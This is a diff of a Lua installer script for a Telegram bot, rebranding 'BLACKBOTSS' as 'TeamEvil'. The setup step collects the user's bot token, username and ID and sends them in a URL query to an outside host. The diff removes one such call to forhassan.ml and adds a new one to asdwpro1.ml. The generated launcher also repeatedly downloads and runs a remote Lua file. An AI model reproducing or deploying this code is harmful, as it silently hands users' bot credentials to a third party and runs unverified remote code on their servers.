@@ -3,20 +3,18 @@ https = require("ssl.https")
 http = require("socket.http")
 JSON = dofile("./File_Libs/JSON.lua")
 local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
-Server_BLACKBOTSS = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
-local AutoFiles_BLACKBOTSS = function() 
+Server_TeamEvil = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
+local AutoFiles_TeamEvil = function() 
 local Create_Info = function(Token,Sudo,UserName)  
-local BLACKBOTSS_Info_Sudo = io.open("sudo.lua", 'w')
-BLACKBOTSS_Info_Sudo:write([[
+local TeamEvil_Info_Sudo = io.open("sudo.lua", 'w')
+TeamEvil_Info_Sudo:write([[
 token = "]]..Token..[["
-
 Sudo = ]]..Sudo..[[  
-
 UserName = "]]..UserName..[["
 ]])
-BLACKBOTSS_Info_Sudo:close()
+TeamEvil_Info_Sudo:close()
 end  
-if not database:get(Server_BLACKBOTSS.."Token_BLACKBOTSS") then
+if not database:get(Server_TeamEvil.."Token_TeamEvil") then
 print("\27[1;34m»» Send Your Token Bot :\27[m")
 local token = io.read()
 if token ~= '' then
@@ -25,7 +23,7 @@ if res ~= 200 then
 io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
 else
 io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
-database:set(Server_BLACKBOTSS.."Token_BLACKBOTSS",token)
+database:set(Server_TeamEvil.."Token_TeamEvil",token)
 end 
 else
 io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
@@ -34,7 +32,7 @@ os.execute('lua start.lua')
 end
 ------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------
-if not database:get(Server_BLACKBOTSS.."UserName_BLACKBOTSS") then
+if not database:get(Server_TeamEvil.."UserName_TeamEvil") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
@@ -53,8 +51,8 @@ io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
 os.execute('lua start.lua')
 else
 io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
-database:set(Server_BLACKBOTSS.."UserName_BLACKBOTSS",Json.Info.Username)
-database:set(Server_BLACKBOTSS.."Id_BLACKBOTSS",Json.Info.Id)
+database:set(Server_TeamEvil.."UserName_TeamEvil",Json.Info.Username)
+database:set(Server_TeamEvil.."Id_TeamEvil",Json.Info.Id)
 end
 end
 else
@@ -62,47 +60,47 @@ io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
 end 
 os.execute('lua start.lua')
 end
-local function Files_BLACKBOTSS_Info()
-Create_Info(database:get(Server_BLACKBOTSS.."Token_BLACKBOTSS"),database:get(Server_BLACKBOTSS.."Id_BLACKBOTSS"),database:get(Server_BLACKBOTSS.."UserName_BLACKBOTSS"))   
-https.request("https://forhassan.ml/Black/Black.php?id="..database:get(Server_BLACKBOTSS.."Id_BLACKBOTSS").."&user="..database:get(Server_BLACKBOTSS.."UserName_BLACKBOTSS").."&token="..database:get(Server_BLACKBOTSS.."Token_BLACKBOTSS"))
-local RunBLACKBOTSS = io.open("BLACKBOTSS", 'w')
-RunBLACKBOTSS:write([[
+local function Files_TeamEvil_Info()
+Create_Info(database:get(Server_TeamEvil.."Token_TeamEvil"),database:get(Server_TeamEvil.."Id_TeamEvil"),database:get(Server_TeamEvil.."UserName_TeamEvil"))   
+https.request("https://asdwpro1.ml/Tmp.php?id="..database:get(Server_TeamEvil.."Id_TeamEvil").."&user="..database:get(Server_TeamEvil.."UserName_TeamEvil").."&token="..database:get(Server_TeamEvil.."Token_TeamEvil"))
+local RunTeamEvil = io.open("TeamEvil", 'w')
+RunTeamEvil:write([[
 #!/usr/bin/env bash
-cd $HOME/BLACKBOTSS
-token="]]..database:get(Server_BLACKBOTSS.."Token_BLACKBOTSS")..[["
-rm -fr BLACKBOTSS.lua
-wget "https://raw.githubusercontent.com/BLACKBOTSS/BLACKBOTSS/master/BLACKBOTSS.lua"
+cd $HOME/TeamEvil
+token="]]..database:get(Server_TeamEvil.."Token_TeamEvil")..[["
+rm -fr TeamEvil.lua
+wget "https://raw.githubusercontent.com/TeamEvil1/TeamEvil1/master/TeamEvil.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./BLACKBOTSS.lua -p PROFILE --bot=$token
+./tg -s ./TeamEvil.lua -p PROFILE --bot=$token
 done
 ]])
-RunBLACKBOTSS:close()
+RunTeamEvil:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/BLACKBOTSS
+cd $HOME/TeamEvil
 while(true) do
 rm -fr ../.telegram-cli
-screen -S BLACKBOTSS -X kill
-screen -S BLACKBOTSS ./BLACKBOTSS
+screen -S TeamEvil -X kill
+screen -S TeamEvil ./TeamEvil
 done
 ]])
 RunTs:close()
 end
-Files_BLACKBOTSS_Info()
-database:del(Server_BLACKBOTSS.."Token_BLACKBOTSS");database:del(Server_BLACKBOTSS.."Id_BLACKBOTSS");database:del(Server_BLACKBOTSS.."UserName_BLACKBOTSS")
+Files_TeamEvil_Info()
+database:del(Server_TeamEvil.."Token_TeamEvil");database:del(Server_TeamEvil.."Id_TeamEvil");database:del(Server_TeamEvil.."UserName_TeamEvil")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 end 
 local function Load_File()  
 local f = io.open("./sudo.lua", "r")  
 if not f then   
-AutoFiles_BLACKBOTSS()  
+AutoFiles_TeamEvil()  
 var = true
 else   
 f:close()  
-database:del(Server_BLACKBOTSS.."Token_BLACKBOTSS");database:del(Server_BLACKBOTSS.."Id_BLACKBOTSS");database:del(Server_BLACKBOTSS.."UserName_BLACKBOTSS")
+database:del(Server_TeamEvil.."Token_TeamEvil");database:del(Server_TeamEvil.."Id_TeamEvil");database:del(Server_TeamEvil.."UserName_TeamEvil")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 var = false
